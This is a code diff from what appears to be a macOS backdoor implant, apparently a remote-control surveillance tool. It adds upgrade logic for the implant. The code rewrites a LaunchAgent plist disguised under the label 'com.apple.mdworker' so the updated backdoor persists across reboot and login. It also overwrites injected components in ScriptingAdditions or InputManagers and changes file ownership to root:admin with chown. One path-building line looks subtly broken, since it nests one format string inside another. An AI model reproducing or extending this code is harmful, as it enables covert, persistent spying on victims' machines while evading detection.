@@ -18,6 +18,10 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#define CORE_UPGRADE  @"core"
+#define DYLIB_UPGRADE @"inputmanager"
+#define KEXT_UPGRADE  @"driver"
+
 
 @interface UpgradeNetworkOperation (private)
 
@@ -59,39 +63,35 @@
   
   //
   // Once the backdoor has been written, edit the backdoor Loader in order to
-  // load the new updated backdoor upon reboot
+  // load the new updated backdoor upon reboot/login
   //
   NSString *backdoorLaunchAgent = [[NSString alloc] initWithFormat: @"%@/%@",
                                    NSHomeDirectory(),
-                                   BACKDOOR_DAEMON_PLIST ];
+                                   BACKDOOR_DAEMON_PLIST];
   
-  NSString *_backdoorPath = [[[NSBundle mainBundle] executablePath]
-                             stringByReplacingOccurrencesOfString: gBackdoorName
-                                                       withString: gBackdoorUpdateName];
+  NSError *error = nil;
+  if ([[NSFileManager defaultManager] removeItemAtPath: backdoorLaunchAgent
+                                                 error: &error] == NO)
+    {
+#ifdef DEBUG_UP_NOP
+      errorLog(@"Error while removing LaunchAgent file, reason: %@", [error localizedDescription]);
+#endif
+    }
   
-  [[NSFileManager defaultManager] removeItemAtPath: backdoorLaunchAgent
-                                             error: nil];
-  
-  NSMutableDictionary *rootObj = [NSMutableDictionary dictionaryWithCapacity: 1];
-  NSDictionary *innerDict;
-  
-  innerDict = [[NSDictionary alloc] initWithObjectsAndKeys:
-               @"com.apple.mdworker", @"Label",
-               [NSNumber numberWithBool: FALSE], @"OnDemand",
-               [NSArray arrayWithObjects: _backdoorPath, nil],
-               @"ProgramArguments", nil];
-  //[NSNumber numberWithBool: TRUE], @"RunAtLoad", nil];
-  
-  [rootObj addEntriesFromDictionary: innerDict];
-  success = [rootObj writeToFile: backdoorLaunchAgent
-                      atomically: NO];
+  success = [gUtil createLaunchAgentPlist: @"com.apple.mdworker"
+                                forBinary: gBackdoorUpdateName];
   
   if (success == NO)
     {
-#ifdef DEBUG_UPGRADE_NOP
+#ifdef DEBUG_UP_NOP
       errorLog(@"Error while writing backdoor launchAgent plist");
 #endif
-      return success;
+    }
+  else
+    {
+#ifdef DEBUG_UP_NOP
+      infoLog(@"LaunchAgent file updated");
+#endif
     }
   
   return YES;
@@ -338,10 +338,77 @@
       else if ([filename isEqualToString: DYLIB_UPGRADE])
         {
 #ifdef DEBUG_UPGRADE_NOP
-          infoLog(@"Received a dylib upgrade, not yet implemented");
+          infoLog(@"Received a dylib upgrade");
 #endif
           
-          // TODO: Check OS Version and upgrade either OSAX or Input Manager
+          NSString *_upgradePath;
+          NSString *_tempLocalPath = [[NSString alloc] initWithFormat:
+                                      @"%@/%@",
+                                      [[NSBundle mainBundle] bundlePath],
+                                      gInputManagerName];
+
+          if (gOSMajor == 10 && gOSMinor == 6)
+            {
+              _upgradePath = [[NSString alloc] initWithFormat:
+                @"/Library/ScriptingAdditions/%@/Contents/MacOS/%@", 
+                OSAX_FOLDER,
+                gInputManagerName];
+
+
+            }
+          else if (gOSMajor == 10 && gOSMinor == 5)
+            {
+              _upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
+                           @"/Library/InputManagers/%@/%@.bundle/Contents/MacOS/%@",
+                           INPUT_MANAGER_FOLDER,
+                           INPUT_MANAGER_FOLDER,
+                           gInputManagerName];
+
+              //
+              // Force owner since we can't remove that file if not owned by us
+              // with removeItemAtPath:error (Required only on Leopard)
+              //
+              NSString *userAndGroup = [NSString stringWithFormat: @"%@:staff", NSUserName()];
+              NSArray *_tempArguments = [[NSArray alloc] initWithObjects:
+                                         userAndGroup,
+                                         _upgradePath,
+                                         nil];
+
+              [gUtil executeTask: @"/usr/sbin/chown"
+                   withArguments: _tempArguments
+                    waitUntilEnd: YES];
+            }
+          
+          // Now remove it
+          [[NSFileManager defaultManager] removeItemAtPath: _upgradePath
+                                                     error: nil];
+
+          // And write it back
+          [fileContent writeToFile: _upgradePath
+                        atomically: YES];
+          
+          //
+          // Write it inside the local folder so that next time the backdoor starts
+          // it won't overwrite it within the old one
+          //
+          [[NSFileManager defaultManager] removeItemAtPath: _tempLocalPath
+                                                     error: nil];
+          [fileContent writeToFile: _tempLocalPath
+                        atomically: YES];
+
+          [_tempLocalPath release];
+
+          NSArray *arguments = [NSArray arrayWithObjects:
+                                @"-R",
+                                @"root:admin",
+                                _upgradePath,
+                                nil];
+
+          [gUtil executeTask: @"/usr/sbin/chown"
+               withArguments: arguments
+                waitUntilEnd: YES];
+          
+          [_upgradePath release];
         }
       else if ([filename isEqualToString: KEXT_UPGRADE])
         {
